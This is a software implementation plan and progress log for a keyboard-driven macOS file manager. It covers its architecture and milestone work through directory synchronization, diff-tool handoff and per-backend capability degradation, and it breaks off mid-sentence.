# Dirnex — implementation plan

A dual-pane, keyboard-first file manager for macOS in the spirit of Total Commander,
built native (Swift), with macOS-only superpowers TC never had: Quick Look, Spotlight
search, APFS clones, Finder tags, a command palette, and universal undo.

Status: planning · Created: 2026-07-05

---

## 1. Product goals

**Must be true at 1.0:**

- Fully operable without a mouse. Tab switches panels, typing filters, F-keys drive
  operations, selection is independent of the cursor.
- File operations never block the UI. Everything runs through a background queue with
  progress, pause/resume, and conflict resolution.
- Feels native: Quick Look, Trash, drag-and-drop, dark mode, Finder tags, share sheet.
- Fast on ugly inputs: a 100k-entry directory opens and scrolls without jank.
- Undo works for file operations, not just text fields.

**Non-goals (for 1.0):**

- Windows/Linux ports.
- App Store distribution (sandbox is incompatible with a real file manager).
- An open binary plugin API (revisit post-1.0; automation hooks cover most needs).
- Cloud-provider integrations beyond what the filesystem already exposes
  (iCloud/Dropbox folders work as folders; no proprietary APIs).

## 2. Architecture decisions (locked unless proven wrong)

| Decision | Choice | Rationale |
|---|---|---|
| Language | Swift 6, strict concurrency | Native perf, actors fit the operation engine |
| File panes | AppKit `NSTableView` | 100k rows, total keyboard control; SwiftUI still weak here |
| Secondary UI | SwiftUI (settings, palette, dialogs, onboarding) | Velocity where perf doesn't matter |
| Core logic | `DirnexCore` — local SwiftPM package, zero AppKit imports | Testable headless; UI is a thin client |
| VFS | Protocol-based virtual filesystem from day one | Archives/SFTP become "just another backend"; retrofitting is painful |
| Watching | FSEvents (per-directory, coalesced) | Live panel refresh |
| Copy path | `copyfile()` with `COPYFILE_CLONE`, fall back to chunked copy with progress callbacks | Instant same-volume APFS copies |
| Delete | Trash via `NSWorkspace` by default; permanent delete behind a modifier | Safety first |
| Sandbox | None. Developer ID + notarization, distributed outside MAS | Needs Full Disk Access |
| Updates | Sparkle 2 | Standard for non-MAS apps |
| Min macOS | 14 (Sonoma) | Modern APIs, still covers the realistic user base |
| Persistence | JSON/plist for config; SQLite for frecency + undo journal | Boring and debuggable |

### Core abstractions

```
DirnexCore
├── VFS
│   ├── VFSBackend (protocol): list, stat, read, write, capabilities
│   ├── VFSPath: backend id + path within backend (composable: zip inside sftp)
│   ├── LocalBackend (M1) · ArchiveBackend (M4) · SFTPBackend (M5)
│   └── DirectoryModel: sorted/filtered snapshot a panel renders; FSEvents-driven
├── Operations
│   ├── Operation (copy/move/delete/rename/pack): source set → destination
│   ├── OperationQueue actor: serial-per-volume scheduling, pause/resume, ETA
│   ├── ConflictPolicy: ask / overwrite / skip / keep-both / newer-only
│   └── UndoJournal: reversible record per operation (SQLite)
└── Services
    ├── Frecency store · Hotlist · History
    ├── Search (mdfind + streamed content grep)
    └── GitStatusProvider (M6)
```

**Rule:** the app target contains no file-manipulation logic. If it touches bytes,
it lives in `DirnexCore` and has tests.

## 4. Milestones

Sizes are relative (S ≈ days, M ≈ 1–2 weeks, L ≈ 3+ weeks of focused work).
Each milestone ends in something runnable; no milestone depends on a later one.

### M0 — Scaffolding (S)

Goal: empty but real project; every later PR lands on green CI.

- [x] Xcode project + `DirnexCore` SwiftPM package, Swift 6 strict concurrency
- [x] SwiftFormat/SwiftLint config; CI (GitHub Actions: build + tests on macOS runner)
- [x] Fixture generator: script that builds test directory trees (deep nesting,
      100k files, weird names: emoji, NFD/NFC unicode, 1000-char paths, symlinks)
- [x] App icon placeholder; ad-hoc signing for local/CI (Developer ID deferred to M7)

Exit: `xcodebuild test` green in CI; app launches to an empty window. ✅ met locally
(CI configured; Developer ID signing intentionally deferred to M7 per §2 "distributed
outside MAS" — ad-hoc signing runs everywhere without a team).

Notes:
- Xcode project uses file-system-synchronized groups (objectVersion 77) so no file
  generator (XcodeGen/Tuist) is needed — `git clone && xcodebuild test` just works.
- `DirnexCore` is a standalone SwiftPM package tested via `swift test`. It is wired
  into the app target as a local package dependency in M1, when the app first needs it.

### M1 — Read-only dual-pane browser (L)

Goal: the app already feels good with zero file operations. This milestone defines
the product's feel; do not rush it.

- [x] `LocalBackend` + `DirectoryModel`: list, stat, sort (name/size/date/ext), hidden-files toggle
- [x] Panel view: `NSTableView`, virtualized (view reuse + per-extension icon cache), columns:
      name, size, date; header-click sort with direction indicator. 60fps/100k budget not yet
      measured — deferred to the M1 exit gate / M7 perf pass.
- [x] Two panels + splitter; active-panel highlight; Tab switches
- [x] Keyboard core: arrows/Home/End/PageUp/PageDown, Enter (open dir / launch file),
      Cmd+Down/Up, and type-to-filter with live narrowing. Backspace is filter-aware (trims
      the filter, else goes up); Esc clears filter then marks (via `cancelOperation:`).
- [x] Selection model: Space/Insert toggle-and-advance, Cmd+A (mark all), `*` invert,
      `+`/`-` glob select, and Space-on-directory in-place recursive sizing.
- [x] Tabs per panel: new (Cmd+T)/close (Cmd+W)/switch (Cmd+Shift+[ / ])/drag-reorder,
      restored on relaunch. Tab bar auto-hides at a single tab.
- [x] Path bar: clickable breadcrumbs, Cmd+L to edit as text with completion
- [x] Volumes/places strip (replaces TC's drive letters); eject
- [x] FSEvents: panels refresh live, preserving cursor and selection
- [x] Quick Look on Cmd+Y (Space stays reserved for selection, per §7); previews the marked
      set or the cursor file, tracks the cursor live
- [x] Drag out to other apps; drag in = reveal only (real drop lands in M2)
- [x] Sort/column state per tab, persisted. Per-tab **sort** (key + direction) and per-tab
      **column widths/order** both live in each tab and persist across launches — switching
      tabs swaps the shared table's column geometry in/out.

_Shipped over 11 passes (2026-07-05 → 07-06). Per-pass detail (files, design rationale, gotchas) lives in git history and the memory topic file._

Exit: can live in it for browsing all day; 100k-dir opens < 150 ms warm; scroll never
drops frames; unicode/symlink fixtures render correctly.

### M2 — Operation engine (L)

Goal: TC's killer feature — queued, non-blocking, undoable file operations.

- [x] `Operation` model ✅ + `OperationQueue` actor ✅: concurrent across volume pairs,
      serial per volume pair (no disk thrashing); pause/resume, cancel, aggregate
      progress + ETA — landed as `FileOperationQueue` (renamed only to dodge
      `Foundation.OperationQueue`) and now **wired into the app** (F5/F6 route through it,
      window-bottom queue bar). "Add to queue" vs "run now" as an explicit choice is a
      later nicety — everything runs through the queue today
- [x] Copy (F5): APFS clone fast path; chunked fallback with per-file + total progress;
      preserves xattrs, permissions, dates, Finder tags; throughput/ETA readout ✅ (queue bar)
- [x] Move (F6): rename fast path same-volume; copy+delete across volumes
- [x] Delete (F8): to Trash; Shift+F8 permanent with explicit confirm
- [x] New folder (F7) ✅, inline rename (F2) ✅ — Enter-on-name deferred (Enter opens
      the cursor entry in the TC key model, so F2 is the rename trigger)
- [x] Progress UI: the window-bottom **queue bar** ✅ — aggregate determinate progress +
      live throughput + ETA, current-item label, pause/resume + cancel-all buttons,
      non-blocking (replaced the modal progress sheet, now deleted) — plus an **expandable
      per-job list** ✅ (disclosure chevron → one scrollable row per queued copy/move, each
      with its own progress bar + cancel button)
- [x] Conflict engine: ask/overwrite/skip/keep-both ✅ + newer-only ✅; **rich per-file
      dialog** ✅ (side-by-side thumbnails + size + date, newer item flagged) with **"apply
      to all"** ✅ — the engine now yields per conflict (`ConflictPolicy.ask` +
      `resolveConflict` callback). Full side-by-side text diff still deferred (thumbnails
      already give images a preview and text files a content peek)
- [x] Undo journal: Cmd+Z reverses move/rename/copy/new-folder + delete-to-Trash restore ✅;
      journal survives relaunch (JSON in UserDefaults) ✅; overwrites marked non-reversible and
      surfaced ✅ — reversal logic + property tests in `DirnexCore/…/UndoJournal.swift`.
      **Redo (Cmd+Shift+Z) added** ✅: every `UndoStep` is now invertible, so redo is "undo of
      the undo" through the same `revert` executor; a redo stack rides alongside undo (a fresh
      op clears it), both stacks persist across relaunch, and a keep-both copy is redone to its
      exact renamed landing path — property tests `op + undo + redo == op` per operation kind.
      **Selection undo added** ✅: marking gestures (Space, Cmd+A, invert, +/- pattern select,
      Cmd/Shift-click, Esc-clear) join the *same* Cmd+Z timeline. The journal now holds a
      heterogeneous `UndoEntry` — `.fileOperation(UndoRecord)` or `.selection(SelectionChange)` —
      so one Cmd+Z walks back through everything in order; a selection change touches no bytes
      (it swaps a pane's marks, routed by `PaneSide`) and is session-only (never persisted). Menu
      titles track the gesture ("Undo Mark", "Redo Select All"). Verified live: Space→Undo/Redo
      and Select-All-over-a-mark unwinds one entry at a time. **Side-effect clears are journaled
      too** so a wrongly-lost selection is recoverable: leaving a folder (navigation clears marks
      in `setListing`) records the loss against the *departed* folder — undo restores them on
      return — and a right-click that retargets/collapses the marks records it in place. Verified
      live: mark → navigate away+back → ⌘Z restores; mark → right-click another row → ⌘Z restores.
- [x] Errors: failures collected + summarized ✅; **per-file skip/retry/abort** ✅ — the engine
      yields per failed source (`CopyEngine.run(onError:)` → `ErrorResolution` skip/retry/abort),
      bridged to a main-actor `ErrorDialog` by `ErrorPrompter` ("apply to all" = skip-all)
- [x] Drop onto panel = real copy/move through the queue ✅ (pane-to-pane, into a
      subfolder, or from Finder; Finder's copy-vs-move conventions; routed through the
      shared queue via the same `submitTransfer` as F5/F6)
- [x] Core test suite on fixtures: cancellation mid-copy ✅, conflicts ✅, cross-volume ✅,
      symlink ✅, permission errors ✅, disk-full ✅, source-changed-during-copy ✅

_Shipped over 12 passes (2026-07-06 → 07-07); 130+ core tests. Per-pass detail lives in git history and the memory topic file._

Exit: 50 GB copy runs in background while browsing stays 60fps; yanking a USB drive
mid-copy produces a sane error, not a hang; Cmd+Z after a bad move actually fixes it.

### M3 — Discoverability layer (M)

Goal: fix TC's adoption problem — nobody should need the manual.

- [x] Cmd+K command palette: fuzzy search over every action, shows shortcuts,
      recents on top; palette actions and menu bar generated from one action registry ✅
- [x] Directory hotlist (Ctrl+D): pin, reorder, jump ✅
- [x] Per-panel history (Alt+Down list; Cmd+[ / Cmd+] back/forward) ✅
- [x] Frecency jump: visit tracking; path bar accepts fuzzy fragments
      ("dl" → ~/Downloads), zoxide-style scoring ✅ (JSON store; SQLite deferred like undo)
- [x] Workspaces: save/restore both panels with all tabs, named, switchable from palette ✅
      (JSON store; per-workspace palette entries deferred — surfaced via the "Workspaces…" popup)
- [x] Settings window (SwiftUI): general, panels, operations, shortcuts ✅
- [x] Rebindable shortcuts with conflict detection; TC-compatible preset and macOS preset ✅

_Shipped over 6 passes (2026-07-08). Per-pass detail lives in git history and the memory topic file._

Exit: a new user can discover copy/move/hotlist through the palette alone; power user
can rebind everything. ✅ met — palette (pass 1) + a full rebind UI with conflict detection
and two presets.

### M4 — VFS payoff (L)

Goal: cash in the VFS abstraction from M0.

- [x] `ArchiveBackend`: **browse zip/tar/tgz/7z as folders ✅**, **F5 copy-out ✅**, **Quick Look /
      Quick View inside ✅**, **pack via ⌥F5 ✅**, **nested archives (browse/extract a zip inside a
      zip) ✅** (via `bsdtar`, not libarchive — the C-module gate stays deferred)
- [x] Archive writes: **delete inside zip via F8 ✅ + add-into via paste ⌘V / F5 / F6 ✅**
      (extract → edit the tree → repack → atomic swap; rewrite strategy, journal-safe temp file)
- [x] Multi-rename tool: pattern tokens ([N] name, [C] counter, [E] ext, date tokens),
      regex find/replace, case transforms, live preview table, applies as one undoable batch
- [x] Search (Alt+F7 / palette): mdfind-backed name+content search with filter chips
      (kind, size, date ✅ — tag chip + content-grep fallback for non-indexed volumes deferred)
- [x] Search results → virtual panel listing: normal cursor/selection/F5 on results
- [x] Quick view panel (⌃Q toggle — Cmd+Q quits, Cmd+Shift+Q was free but ⌃Q is the TC key):
      inactive panel becomes live Quick Look/text preview of the file under cursor
- [x] Saved searches as virtual folders in the places strip ✅ — name a results panel via
      Go ▸ Save Search… (⌘S when a results tab is active), it lands in the sidebar's
      **Searches** section (magnifier icon); click to re-run into a fresh results tab;
      right-click → Run / Rename… / Delete

Exit: open a zip, fish two files out, repack — no temp-folder dance; rename 500 photos
by date pattern and undo it; search feeds a panel.

_Shipped over 11 passes (2026-07-09 → 07-12); 341 core tests. Per-pass detail (ArchiveBackend rewrite strategy, nested-archive mapping, saved searches, recurring gotchas) lives in git history and the memory topic file._

### M5 — Network and sync (M)

- [x] `SFTPBackend`: connection manager, **key auth + password auth**; **browse + byte transfer +
      mid-file resume** all DONE and verified live (via the system `sftp` CLI, not
      swift-nio-ssh/libssh2 — the same sidestep M4 made with `bsdtar`). Copy-out (`get`) / copy-in
      (`put`), remote mkdir / rename / recursive-delete all run through the standard queue; an SFTP
      pane is writable (`[.read, .write, .rename]`) so the pass-5 grey-out + Trash-less
      confirmed-permanent-delete light up. **Password auth** (pass 9) via `SSH_ASKPASS` (no PTY
      needed) + Keychain storage. **Mid-file resume** (pass 10) — `copyFile` picks up a partial
      destination via `get -a`/`put -a` instead of restarting; verified live against a real server
- [x] **SMB shares + unified connection manager** (built + verified live 2026-07-14): browse/copy to another
      Mac / PC / NAS over SMB, and one place that keeps every saved remote — SFTP and SMB alike. SMB
      is done the OS-native way: macOS ships **no `smbclient`** CLI to shell out to, so the sidestep
      here is the **mounter**, not a client — `NetFSMountURLSync` / `mount_smbfs` mounts
      `smb://user@host/share` and the existing `LocalBackend` browses the resulting `/Volumes/…`
      tree, so every M2 op, sync-dirs, compare-by-content, and archive-over-SMB works unchanged —
      **no new `CompositeBackend` routing, no libsmb2 dependency** (the deliberate choice over a
      protocol `SMBBackend`, mirroring SFTP's system-CLI sidestep). Caps reuse the pass-5 degradation
      path (read/write/rename, no clone, Trash-varies → confirmed-permanent-delete). The **connection
      manager** unifies today's ephemeral SFTP registry with persisted saved servers: a
      `ServerConnection` / `ServerConnections` core (name-as-identity, like `SavedSearch`) + a
      `ServerConnectionStore` + a **Servers** sidebar section (mirrors **Searches**), plus a
      generalized Connect-to-Server prompt (protocol picker SFTP | SMB + Save). Subsumes the deferred
      "saved SFTP connections in the sidebar" item
- [x] Capability degradation: panels grey out unsupported ops per backend ✅ (per-path
      `capabilities(for:)`; no Trash → explicit permanent-delete confirm ✅; no clone →
      always chunked ✅) — driven off the owning backend's caps, ready for SFTP to plug into
- [x] Synchronize directories: two-panel diff view (left-only / right-only / differs /
      same ✅), by size+date or content ✅; selective sync actions through the queue ✅;
      per-row *direction override* ✅ (right-click a row → flip a copy the other way, or turn a
      copy into a delete; also resolves a bidirectional `differ` conflict by hand) — include/
      exclude per row already done
- [x] Compare by content: **byte compare ✅** (`ByteComparator`, drives sync `.content` mode) +
      **external-diff handoff ✅** (FileMerge/Kaleidoscope/BBEdit via `ExternalDiffTool` — a
      **Compare By Contents…** command plus a right-click **Compare with …** in the sync sheet)

Exit: mirror a local folder to a server over SFTP, verify with sync-dirs, all queued
and pausable; and browse/copy to an SMB share on another Mac or NAS, connected and
managed from the Servers sidebar.

Progress (2026-07-12, M5 pass 1): the **directory-synchronization comparison core** landed —
the tested, headless *comparison* half of the "Synchronize directories" item (its two-panel
diff-view UI + queue wiring is the next pass; boxes stay `[ ]` until that lands). Picked first
because it's pure Swift and slots straight into the core→app rhythm, whereas `SFTPBackend` needs
a swift-nio-ssh/libssh2 dependency + a live server to test against — the M5 infra gate, analogous
to M4's libarchive gate. Two new `DirnexCore/Services/` files, no changes to existing APIs:
- **`DirectorySync.swift`** — `DirectorySync.compare(left:right:leftBackend:rightBackend:
  comparison:tolerance:includingIdentical:isCancelled:contentsEqual:)` walks both trees in
  lock-step (iterative explicit-stack over a private `DirectoryPair{left,right,prefix}`, like
  `DirectorySizer`, so deep trees can't blow the call stack) and returns one `SyncEntry`
  (`relativePath`+`name`+`left:FileEntry?`+`right:FileEntry?`+`status`, `Identifiable` by
  relative path) per differing/one-sided item, **sorted by relativePath** (deterministic
  regardless of traversal order → stable tests + stable UI). `SyncStatus` = `leftOnly /
  rightOnly / leftNewer / rightNewer / differ / identical / typeMismatch`. Design decisions:
  (1) directories present on **both** sides are descended into but emit **no row** (rows =
  actionable file diffs + one-sided items); a directory on **only one** side is a **single**
  non-recursed subtree row (the app copies/deletes it wholesale, matching TC's collapsed
  folder row). (2) `SyncComparison.sizeAndDate` (size equal AND |Δmtime| ≤ `tolerance`,
  default **2 s** for FAT/exFAT coarseness, TC's value) vs `.content` (exact bytes; short-
  circuits on size mismatch, falls back to size+date for symlinks/specials). (3) content
  equality is an **injected** `contentsEqual` closure (default `ByteComparator.localFilesEqual`)
  so the engine needs no read-primitive on `VFSBackend` and tests drive content mode with a
  fake. (4) **SAFETY: a listing failure propagates** — an unreadable dir throws rather than
  reading as empty, because silently doing so could delete the other side's matching files in
  a mirror (contrast `DirectorySizer`, which *does* swallow — there a partial number is fine;
  here a partial listing is dangerous). `defaultAction(for:direction:)` derives the pre-checked
  per-row action for `SyncDirection.leftToRight / rightToLeft / bidirectional` → `SyncAction`
  (`none / copyToRight / copyToLeft / deleteLeft / deleteRight / conflict`): a mirror is
  authoritative (overwrites even a newer destination + prunes destination-only items),
  bidirectional unions + newer-wins + never deletes + flags `differ`/`typeMismatch` as
  `conflict`; a file-vs-dir `typeMismatch` is **always** `conflict` in every direction (the
  strict-and-safe stance from MultiRename — never auto-delete a whole dir to drop a file in).
- **`ByteComparator.swift`** — knocks out the byte-compare half of the "Compare by content"
  item: `ByteComparator.localFilesEqual(_:_:chunkSize:isCancelled:)` chunk-compares two local
  regular files (128 KB chunks, never loads whole files), short-circuits `false` on a size
  mismatch without reading, `true` on same-path/two-empties; throws `.unsupported` for a
  non-`.local` path (network read arrives with `SFTPBackend`) or a directory, and normalizes
  read failures to `VFSError` via a POSIX-errno recovery helper. (External-diff-tool handoff —
  FileMerge/Kaleidoscope/BBEdit — is the remaining slice of that item, an app-layer pass.)
+18 `DirectorySync` +9 `ByteComparator` tests → **368 core tests** (was 341). Whole thing
`swift test` green, swiftformat/swiftlint-strict clean; app target untouched (new files only,
no existing-API changes, so no rebuild needed). GOTCHA hit: swiftlint `large_tuple` (>2 members)
on the work-stack `(left,right,prefix)` triple → extracted the private `DirectoryPair` struct.
NEXT M5: the sync-dirs UI (two-panel diff view driven by `compare`, per-row action override,
apply through the M2 `FileOperationQueue`); then the SFTPBackend infra gate; capability
degradation; external-diff handoff.

Progress (2026-07-12, M5 pass 2): the **Synchronize Directories UI** landed — the diff-view +
apply half of the sync item (**that box now `[x]`**; byte-compare `[~]`). One new headless
command + three app files, wiring the pass-1 `DirectorySync` engine into a real sheet that
reconciles the two panes through the M2 queue. VERIFIED LIVE end-to-end (no overlay this
session, so fully mouse-driven). Pieces:
- **Command** (core): `CommandCatalog` gains `file.syncDirectories` ("Synchronize Directories…",
  `.file`, **no shortcut** → conflict-free; new `coversSyncDirectories` test → **369 core
  tests**). Wired app-side in `CommandBinding` (→ `synchronizeDirectories(_:)`) and
  `MainMenuBuilder` (File menu, right after Pack). GOTCHA: adding one command tipped the
  `CommandCatalog` main-enum body over swiftlint `type_body_length` 250 → moved the `workspace`
  array into the existing bottom extension (where window/application already live).
- **`SyncDirectoriesController.swift`** — the sheet (modeled on `MultiRenameController`,
  `presentAsSheet`-retained). A **Direction** segmented control (Left→Right / Both Directions /
  Right→Left) and a **Compare by** control (Size & Date / Content) over a diff `NSTableView`:
  columns *include-checkbox · Item (relativePath, "/"-suffixed for dirs) · leftFolder detail ·
  action glyph · rightFolder detail*. Action column = green →/← for a copy, red ✕ for a delete
  (which side is clear from the populated detail column), ⚠ for a conflict, each with a tooltip.
  A **direction change re-derives actions in memory** (`recomputeActions`, instant); a
  **comparison change re-runs `DirectorySync.compare` off-main** (content mode reads bytes) with
  a spinner. Footer reads "N to copy, M to delete · K conflicts skipped"; empty result →
  "The folders are already in sync." with Synchronize disabled. Conflicts render with a disabled
  checkbox (no safe action). GOTCHAS (swiftlint, both recurring): `large_tuple` on the columns
  array / `row(at:)` / `actionDisplay` → replaced with an `addColumn` helper, returning the
  `fileprivate` `Row` struct, and an `ActionStyle` struct; `type_body_length` on the class →
  moved the four `make*` view-builders into a same-file `private extension` (extensions don't
  count toward the type body). NOTE: `Row` had to be `fileprivate` (not `private`) because the
  `fileprivate row(at:)` accessor returns it.
- **`PanelViewController+Sync.swift`** — entry point + apply. `synchronizeDirectories(_:)`
  casts `host as? BrowserWindowController` to always use the **physical** left/right panes (so
  the direction controls match the on-screen layout regardless of focus), gates on two distinct
  real local folders (`canSynchronize`, also the `validateMenuItem` case), and presents the
  sheet. On commit: **copies are batched by destination directory** (multiple sources → one
  `FileOperation`) and enqueued under `.overwrite` (the user already decided in the diff — no
  per-file prompt; atomic temp-swap keeps the original safe), so the window's queue drives
  progress/undo exactly like F5; **deletes go to the Trash** off-main as one pass, journaled via
  `UndoRecord.trash`. A **delete count triggers a confirm sheet** first ("… will move N items to
  the Trash"). The relative path's parent always exists on the destination side (the engine only
  descends into both-sides dirs), so a nested copy's target directory is guaranteed present.
LIVE TEST (seeded both panes onto fixture trees via the `Dirnex.tabs.<side>` UserDefaults JSON):
the sheet listed exactly the 6 differences (identical `same.txt` correctly omitted) with
"5 to copy, 1 to delete"; Right→Left flipped every row (3 copy ←, 3 delete ✕, "3 to copy, 3 to
delete"); Content mode rescanned to the same 6; Synchronize (Left→Right) raised the delete
confirm, then on disk overwrote `changed.txt` with the newer left copy, copied `only_left.txt` +
the nested `sub/leftonly_nested.txt`, overwrote the nested `sub/nested.txt`, **recursively copied
the one-sided `leftdir/deep/x.txt` subtree**, and trashed `only_right.txt`; a re-scan then
reported "already in sync" (metadata preserved → idempotent). App `xcodebuild` + `swift test`
green, swiftformat/swiftlint-strict clean. NEXT M5: per-row direction override (flip one row);
the `SFTPBackend` infra gate (swift-nio-ssh/libssh2 + live server); capability degradation;
external-diff-tool handoff.

Progress (2026-07-12, M5 pass 3): **per-row direction override** — the one deferred niceness on
the sync item, **now `[x]`**. Right-click any diff row to override its action against the global
direction: flip a copy the other way, or turn a copy into a delete; a bidirectional `differ`
conflict (or a mirror row you disagree with) is resolved by hand this way. Two-part, core→app as
always:
- **Core** (pure, tested): `DirectorySync.availableActions(for status:) -> [SyncAction]` (+ a
  `SyncEntry.availableActions` convenience) — the *actionable* choices a user may assign to one
  row: a both-sides difference (`leftNewer`/`rightNewer`/`differ`) → `[.copyToRight, .copyToLeft]`
  (copy either way, never delete a file that exists on both sides); a one-sided item → propagate
  *or* delete from its side (`leftOnly`→`[.copyToRight, .deleteLeft]`, mirror for `rightOnly`);
  `identical` and `typeMismatch` → `[]` (no safe override — a file-vs-folder clash still can't be
  auto-resolved, matching the strict stance). `.none`/`.conflict` are deliberately absent (skip is
  the checkbox's job; conflict is a non-action). +5 tests → **374 core tests** (was 369).
- **App**: `SyncDirectoriesController` gains an `NSMenu` (delegate = self) on the diff table;
  `menuNeedsUpdate` rebuilds it per-click from `tableView.clickedRow` — one item per
  `availableActions`, a `.on` checkmark on the row's current action, target `setRowAction(_:)`
  (row in `tag`, `SyncAction` in `representedObject`); an empty list shows one disabled caption
  ("One side is a folder — resolve manually"). Picking an item sets the row's action + forces
  `included = true`, reloads that row, and recomputes the footer. Added a "Right-click a row to
  change its action" hint in the controls row. A direction/comparison change still re-derives
  defaults and drops overrides (documented behavior). GOTCHA (recurring, `file_length` this time,
  not `type_body_length`): the new menu tipped the controller over swiftlint's 500-line
  `file_length` → **split the diff-table + override-menu rendering into a companion file**
  `SyncDirectoriesController+DiffTable.swift` (data source + delegate + `NSMenuDelegate` +
  `ActionStyle`). That cross-file split forced widening `Row`, `rowCount`, `row(at:)`,
  `isActionable`, `toggleInclude`, `setRowAction`, `tableView`, `leftDir`, `rightDir` from
  `private`/`fileprivate` to internal (Swift `private` doesn't cross files; a `private`
  `tableView` in a `NSTableViewDelegate`-conforming type even resolves to the delegate *method* in
  the other file → "has no member 'clickedRow'" until widened). App `xcodebuild` (into `build/`
  via `-derivedDataPath build`, since the default DerivedData copy isn't the one LaunchServices
  launches) + `swift test` green, swiftformat/swiftlint-strict clean. VERIFIED LIVE end-to-end:
  seeded two fixture trees (`changed.txt` left-newer, `only_left.txt`, `only_right.txt`, identical
  `same.txt`); right-click `changed.txt` showed "✓ Copy to R / Copy to L" → picked Copy to L (glyph
  → ←); right-click `only_left.txt` showed "✓ Copy to R / Delete from L" → picked Delete from L
  (footer went "2 to copy, 1 to delete" → "1 to copy, 2 to delete"); Synchronize raised the
  **2-item** trash confirm (proving the overridden delete count drives it), and on disk `L/changed.txt`
  became the *right* copy (6 B "right", i.e. copied **leftward** per the override, NOT the L→R
  default's 34 B), `only_left.txt` was trashed from L (not copied to R), `only_right.txt` trashed
  from R — both panes refreshed to identical `changed.txt`+`same.txt`, no crash. NEXT M5: the
  `SFTPBackend` infra gate (swift-nio-ssh/libssh2 + live server); capability degradation;
  external-diff-tool handoff (FileMerge/Kaleidoscope/BBEdit — the remaining `[~]` slice).

Progress (2026-07-12, M5 pass 4): **external-diff-tool handoff** — the remaining `[~]` slice of
Compare-by-content, **now `[x]`**. `ByteComparator` says *whether* two files differ; this opens them
side-by-side in a real diff tool to show *how*. Core→app as always:
- **Core** (pure, tested): `DirnexCore/Services/ExternalDiffTool.swift` — a value descriptor of a
  known diff app (`identifier`+`displayName`+`candidateExecutablePaths` most-preferred-first+
  `leadingArguments`) with `invocation(comparing:with:executableExists:)→ExternalDiffInvocation?`
  (executable + argv = `leadingArguments + [left, right]`; nil when not installed). Locating the
  launcher is an **injected** `(String)->Bool` probe, so the whole thing is testable with no real
  install. Registry `known` = `[.kaleidoscope, .bbEdit, .fileMerge]` (dedicated diff apps first,
  FileMerge/`opendiff` as the ships-with-Xcode fallback); `installed(where:)` filters, `preferred(
  identifier:where:)` honors a saved choice then falls back to the first installed. Paths: FileMerge
  `/usr/bin/opendiff`; Kaleidoscope `ksdiff` and BBEdit `bbdiff` under `/opt/homebrew/bin` then
  `/usr/local/bin`. +8 tests → **383 core tests** (was 374).
- **App**: `Dirnex/Browser/ExternalDiffLauncher.swift` — supplies the real probe
  (`FileManager.isExecutableFile`) and spawns the resolved invocation off-main via `Process`
  (`run()` then detach — never blocks on the GUI tool; streams → nullDevice), mirroring
  `ArchiveExtractor`. `preferredTool()` (cheap) titles/enables the menu; `compare(_:_:completion:)`
  reports `noToolInstalled` / `launchFailed` back on the main actor. Two entry points: (1) a
  right-click **Compare with <tool>…** item prepended to the sync sheet's row menu for any
  both-sides regular-file pair (wired via `SyncDirectoriesController.onCompare`); (2) a standalone
  **Compare By Contents…** File command (`file.compareByContents`, no shortcut → conflict-free;
  `coversCompareByContents` test) that diffs the two panes' **cursor** files (`comparableCursorPair`
  — both must be real local files and distinct; gates `validateMenuItem` via `canCompareByContents`).
  Failures surface through the existing `presentOperationFailure` alert ("No comparison tool found —
  install FileMerge/Kaleidoscope/BBEdit"). App `xcodebuild` (into `build/` via `-derivedDataPath
  build`) + `swift test` green, swiftformat/swiftlint-strict clean. VERIFIED the handoff mechanic
  live: only `/usr/bin/opendiff` is installed here → `preferred()` resolves FileMerge; spawning
  `opendiff <L> <R>` exactly as the launcher does launched FileMerge (confirmed via `pgrep`), then
  quit it. **NEXT M5:** the `SFTPBackend` infra gate (swift-nio-ssh/libssh2 + live server);
  capability degradation. A Settings picker for the preferred diff tool (the `preferred(identifier:)`
  hook already exists) is optional polish.

Progress (2026-07-12, M5 pass 5): **capability degradation** — the second remaining M5 item,
**now `[x]`**. Panels now decide what they offer off the *owning backend's* capabilities rather
than ad-hoc `path.backend == .local` / `isVirtualDirectory` checks, and the delete key degrades to
a confirmed permanent delete on a Trash-less backend — the exact mechanism `SFTPBackend` plugs into
(SFTP has no Trash, no APFS clone). Core→app as always; no SFTP needed to prove it (a partial-
capability test double stands in). Pieces:
- **Core** (pure, tested): `VFSBackend.capabilities(for path:) -> VFSCapabilities` added to the
  protocol with a **default returning the backend-wide `capabilities`** — a single-backend
  implementation is uniform, but a *routing* backend (the app's `CompositeBackend`) overrides it to
  report the caps of whichever concrete backend owns `path`. New `DeleteStrategy` enum (`trash /
  permanent / unsupported`) + `VFSCapabilities.deleteStrategy` computed property encode the
  degradation decision: `.write` absent → `.unsupported`; writable but no `.trash` → `.permanent`
  (SFTP); has `.trash` → `.trash`. `CopyEngine` now guards its clone attempt on
  `backend.capabilities(for: entry.path).contains(.clone)` so a no-clone backend goes **straight to
  chunked** instead of a doomed clone (`.clone` present on Local → unchanged). +7 tests → **390 core
  tests** (was 383): `deleteStrategy` mapping, the `capabilities(for:)` default, a `RoutingStub`
  proving per-path degradation, and a `PartialCapabilityBackend` (a `LocalBackend` decorator with a
  configurable capability set + a clone-call counter) proving CopyEngine skips the clone when
  `.clone` is absent and still attempts it when present. GOTCHA: swiftlint `empty_count` fired on the
  counter's `.count == 0` — renamed the property to `calls`.
- **App**: `CompositeBackend.capabilities(for:)` routes per path — `local.capabilities` for `.local`,
  `.read` for any virtual location (archive/search), cheap by design (no archive mount, like
  `volumeIdentifier(for:)`). `canWriteHere`/`canRenameHere` now read `backend.capabilities(for:
  panel.path).contains(.write/.rename)` (drops the `!isVirtualDirectory` prefix — a virtual pane
  already reports `.read`, and this is correct for a future writable-non-local SFTP where
  `isVirtualDirectory` would wrongly fire). `deleteSelection`/`validateMutatingItem` now branch on
  `capabilities(for:).deleteStrategy`: `.unsupported` → no-op/greyed, `.trash` on F8 → Trash (with the
  existing optional confirm), else (Shift+F8, or F8 on a Trash-less backend) → the confirmed
  permanent-delete path. The **top-level-archive rewrite delete** (`isWritableArchive` →
  `beginArchiveDelete`) still short-circuits *first* — archive writes are the app's separate
  rewrite path, not VFS caps. Left the watch / archive-extract·pack·drop guards on their intentional
  `path.backend == .local` gates (local-only machinery; SFTP-destination is a later SFTP pass — not
  refactored speculatively). New app test `DirnexTests/CompositeBackendTests.swift` (+3 → **7 app
  tests**) asserts the crux: local path = full caps (`deleteStrategy == .trash`), archive + search
  paths = `.read` (`deleteStrategy == .unsupported`). Behavior on today's backends is **identical by
  construction** (traced each branch: local delete = Trash, archive/search delete greyed, New
  Folder/rename greyed on virtual) — the change is degradation *infrastructure* + a behavior-
